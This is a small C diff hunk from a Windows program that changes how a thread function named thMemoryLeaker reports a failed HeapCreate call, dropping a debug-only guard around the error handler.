@@ -23,9 +23,7 @@ DWORD WINAPI thMemoryLeaker(LPVOID lpParam) {
 			Sleep(100);
 		}
 	} else {
-#ifdef DEBUG_MSG
-		fnErrorHandlerW(L"Couldn't create Heap", NULL, L"HeapCreate", MB_OK | MB_ICONERROR);
-#endif // DEBUG_MSG
+		fnERRORHANDLERW(L"Couldn't create Heap", NULL, L"HeapCreate", MB_ICONERROR);
 		return FALSE;
 	}
 }
